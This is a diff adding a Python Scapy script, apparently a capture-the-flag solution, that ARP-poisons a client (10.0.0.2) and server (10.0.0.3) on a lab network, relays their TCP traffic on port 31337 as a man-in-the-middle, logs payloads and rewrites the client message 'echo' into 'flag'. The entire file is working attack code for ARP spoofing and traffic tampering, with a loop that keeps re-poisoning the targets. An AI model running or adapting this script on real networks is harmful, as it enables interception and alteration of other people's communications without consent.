@@ -1,0 +1,131 @@
+from scapy.all import *
+
+interface = "eth0"
+
+local_mac = get_if_hwaddr(interface)
+
+client_ip = "10.0.0.2"
+server_ip = "10.0.0.3"
+
+# 現在のMACアドレスを取得
+client_mac = getmacbyip(client_ip)
+server_mac = getmacbyip(server_ip)
+
+print(f"[+] local  : {local_mac}")
+print(f"[+] client : {client_mac}")
+print(f"[+] server : {server_mac}")
+
+
+# -------------------------
+# ARP poisoning
+# -------------------------
+
+def poison():
+    # Clientに「10.0.0.3は自分(local_mac)だ」と教える
+    arp_client = (
+        Ether(src=local_mac, dst=client_mac) /
+        ARP(
+            op="is-at",
+            hwsrc=local_mac,
+            psrc=server_ip,
+            hwdst=client_mac,
+            pdst=client_ip
+        )
+    )
+
+    # Serverに「10.0.0.2は自分(local_mac)だ」と教える
+    arp_server = (
+        Ether(src=local_mac, dst=server_mac) /
+        ARP(
+            op="is-at",
+            hwsrc=local_mac,
+            psrc=client_ip,
+            hwdst=server_mac,
+            pdst=server_ip
+        )
+    )
+
+    sendp(arp_client, iface=interface, verbose=False)
+    sendp(arp_server, iface=interface, verbose=False)
+
+
+poison()
+
+
+# -------------------------
+# Packet forwarding
+# -------------------------
+
+def process(pkt):
+    if not (pkt.haslayer(Ether) and
+            pkt.haslayer(IP) and
+            pkt.haslayer(TCP)):
+        return
+
+    src = pkt[IP].src
+    dst = pkt[IP].dst
+
+    # Client -> Server
+    if src == client_ip and dst == server_ip:
+
+        p = pkt.copy()
+
+        if p.haslayer(Raw):
+            data = p[Raw].load
+
+            print(f"[C -> S] {data!r}")
+
+            # echo -> flag
+            if data == b"echo":
+                print("[!!!] echo -> flag")
+
+                p[Raw].load = b"flag"
+
+                # Payloadを変更したので再計算
+                del p[IP].chksum
+                del p[TCP].chksum
+
+        # Ethernet headerを書き換えてServerへ転送
+        p[Ether].src = local_mac
+        p[Ether].dst = server_mac
+
+        sendp(p, iface=interface, verbose=False)
+
+    # Server -> Client
+    elif src == server_ip and dst == client_ip:
+
+        p = pkt.copy()
+
+        if p.haslayer(Raw):
+            print(f"[S -> C] {p[Raw].load!r}")
+
+        # Ethernet headerを書き換えてClientへ転送
+        p[Ether].src = local_mac
+        p[Ether].dst = client_mac
+
+        sendp(p, iface=interface, verbose=False)
+
+
+# -------------------------
+# ARP poisoningを定期的に実行
+# -------------------------
+
+import threading
+import time
+
+def poison_loop():
+    while True:
+        poison()
+        time.sleep(1)
+
+threading.Thread(target=poison_loop, daemon=True).start()
+
+
+print("[+] MITM started")
+
+sniff(
+    iface=interface,
+    filter="tcp port 31337",
+    prn=process,
+    store=False
+)
